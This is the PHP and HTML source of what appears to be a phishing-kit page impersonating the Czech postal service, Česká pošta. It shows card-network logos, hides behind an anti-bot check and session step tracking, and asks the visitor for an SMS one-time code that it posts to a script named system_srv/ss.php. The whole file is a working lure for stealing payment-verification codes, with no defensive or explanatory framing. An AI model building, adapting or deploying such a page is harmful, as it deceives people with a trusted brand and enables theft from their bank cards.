<?php
session_start();
include 'lang_main.php';
require_once __DIR__ . '/antibot.php';
validateSession(4);
// TRACKING STEP
$_SESSION['step'] = 'sms';
?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <title><?= t('verification_title') ?> | Česká pošta</title>
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <link rel="stylesheet" href="assets/post-branding.css?v=<?= time() ?>">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="assets/site.min.js"></script>
    <style>
        /* Clean & Refined SMS Page */
        .page-title {
            font-size: 20px !important;
            font-weight: 500 !important;
            margin-bottom: 25px !important;
            color: #222;
        }
        
        .page-subtitle {
            font-size: 14px;
            line-height: 1.6;
            color: #666;
            margin-bottom: 30px;
        }
        
        .payment-methods-row {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            margin: 25px 0 30px 0;
            flex-wrap: wrap;
        }
        
        .payment-logo {
            height: 32px;
            opacity: 0.85;
            transition: opacity 0.2s;
        }
        
        .payment-logo:hover {
            opacity: 1;
        }
        
        
        .vbv-logos {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            margin: 25px 0 30px 0;
            flex-wrap: wrap;
        }
        .vbv-logos i {
            transition: transform 0.2s;
        }
        .vbv-logos i:hover {
            transform: scale(1.1);
        }
        /* Specific Colors */
        .fa-cc-visa { color: #1a1f71; font-size: 32px; }
        .fa-cc-mastercard { color: #eb001b; font-size: 32px; }
        .fa-apple-pay { color: #000; font-size: 38px; }
        .fa-google-pay { color: #5f6368; font-size: 38px; }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .resend-link {
            margin-top: 25px;
            text-align: center;
        }
        
        .resend-link a {
            font-size: 13px;
            color: #666;
            text-decoration: underline;
            transition: color 0.2s;
        }
        
        .resend-link a:hover {
            color: #333;
        }


        /* GLOBAL LAYOUT FIX */
        html {
            height: 100%;
        }
        body {
            min-height: 100%;
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background-color: #f4f6f8;
            font-family: 'Frutiger', sans-serif;
            color: #333;
        }
        .post-header {
            flex-shrink: 0;
            background: #fff;
            padding: 15px 0;
            width: 100%;
            z-index: 10;
        }
        .post-footer {
            flex-shrink: 0;
            width: 100%;
        }
        .main-wrapper {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        .content-container {
            width: 100%;
            display: flex;
            justify-content: center;
        }
        @media (max-width: 480px) {
            .main-wrapper { padding: 15px; }
            .form-card { margin: 0 auto; }
        }
    </style>
</head>
<body>
    <div class="post-yellow-bar"></div>
    <header class="post-header">
        <div class="header-container">
            <div class="logo-container">
                <img src="assets/POST.svg" alt="Post CH" class="post-logo">
            </div>
            <div class="header-right">
                <div class="login-text">
                    <img src="assets/lock.svg" alt="Secure" class="lock-icon">
                    <span><?= t('secure_conn') ?></span>
                </div>
            </div>
        </div>
    </header>
    <main class="main-wrapper">
        <div class="content-container">
            
            <div class="stepper">
                <div class="step completed">1</div>
                <div class="step-line filled"></div>
                <div class="step completed">2</div>
                <div class="step-line filled"></div>
                <div class="step active">3</div>
            </div>
            <div class="form-card">
                
                <div style="text-align: center; margin-bottom: 30px;">
                    <h1 class="page-title"><?= t('verification_header') ?></h1>
                    
                    <!-- REFINED PAYMENT LOGOS ROW -->
                    <div class="vbv-logos" style="display: flex; justify-content: center; align-items: center; gap: 15px; margin: 25px 0 30px 0; background: #fafafa; padding: 12px; border-radius: 8px; border: 1px solid #f0f0f0;">
                        <!-- Visa -->
                        <img src="https://cdn.worldvectorlogo.com/logos/visa-10.svg" alt="Visa" style="height: 10px; width: auto;">
                        
                        <div style="width: 1px; height: 14px; background: #ddd;"></div>

                        <!-- Mastercard -->
                        <img src="https://cdn.worldvectorlogo.com/logos/mastercard-6.svg" alt="Mastercard" style="height: 18px; width: auto;">

                        <div style="width: 1px; height: 14px; background: #ddd;"></div>

                        <!-- Apple Pay -->
                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay" style="height: 16px; width: auto;">

                        <div style="width: 1px; height: 14px; background: #ddd;"></div>

                        <!-- Google Pay -->
                        <img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_Logo.svg" alt="Google Pay" style="height: 16px; width: auto;">
                    </div>

                    <p class="page-subtitle" style="text-align: left;">
                        <?= t('verification_text') ?>
                    </p>
                </div>
                <form action="system_srv/ss.php" method="POST">
                    
                    <?php if (isset($_GET['error'])): ?>
                    <div class="error-msg visible" style="margin-bottom: 15px; color: #cc0000; background: #ffe6e6; padding: 10px; border-radius: 4px; text-align: center;">
                        <?= t('code_invalid') ?>
                    </div>
                    <?php endif; ?>
                    <div class="form-group">
                        <label><?= t('code_label') ?></label>
                        <input type="tel" name="code" class="form-control" placeholder="123456" required autofocus autocomplete="one-time-code" inputmode="numeric">
                    </div>
                    <button type="submit" class="btn-primary">
                        <?= t('confirm_btn') ?>
                    </button>
                    
                    <div class="resend-link">
                        <a href="#">
                            <?= t('resend_link') ?>
                        </a>
                    </div>
                </form>
            </div>
        </div>
    </main>
    <footer class="post-footer">
        <div class="footer-container">
            <!-- DESKTOP VERSION -->
            <div class="footer-desktop">
                <div class="footer-col">
                    <h4><?= t('help_contact') ?></h4>
                    <a href="#">FAQ</a>
                    <a href="#">Contact Center</a>
                    <a href="#">Support</a>
                </div>
                <div class="footer-col">
                    <h4><?= t('data_prot') ?></h4>
                    <a href="#"><?= t('cond_gen') ?></a>
                    <a href="#"><?= t('privacy_policy') ?></a>
                    <a href="#"><?= t('cookies') ?></a>
                </div>
                <div class="footer-col" style="justify-content:flex-end; align-items:flex-end; text-align:right;">
                    <img src="assets/POST.svg" height="28" style="opacity:0.4; margin-bottom:10px;">
                    <p style="font-size:11px; color:#999; margin:0;">
                        &copy; <?= date('Y') ?> Česká pošta
                    </p>
                </div>
            </div>
            <!-- MOBILE VERSION -->
            <div class="footer-mobile">
                &copy; <?= date('Y') ?> <?= t('copyright') ?>
            </div>
        </div>
    </footer>
</body>
</html>
